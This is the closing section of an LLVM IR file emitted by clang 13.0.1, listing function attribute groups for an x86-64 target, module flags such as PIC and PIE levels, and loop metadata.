attributes #1 = { noinline nounwind optnone sspstrong uwtable "frame-pointer"="all" "min-legal-vector-width"="0" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #2 = { nounwind "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #3 = { noreturn nounwind "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #4 = { nounwind readnone willreturn "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #5 = { nounwind }
attributes #6 = { noreturn nounwind }
attributes #7 = { nounwind readnone willreturn }

!llvm.module.flags = !{!0, !1, !2, !3, !4}
!llvm.ident = !{!5}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{i32 7, !"PIC Level", i32 2}
!2 = !{i32 7, !"PIE Level", i32 2}
!3 = !{i32 7, !"uwtable", i32 1}
!4 = !{i32 7, !"frame-pointer", i32 2}
!5 = !{!"clang version 13.0.1"}
!6 = distinct !{!6, !7}
!7 = !{!"llvm.loop.mustprogress"}
!8 = distinct !{!8, !7}
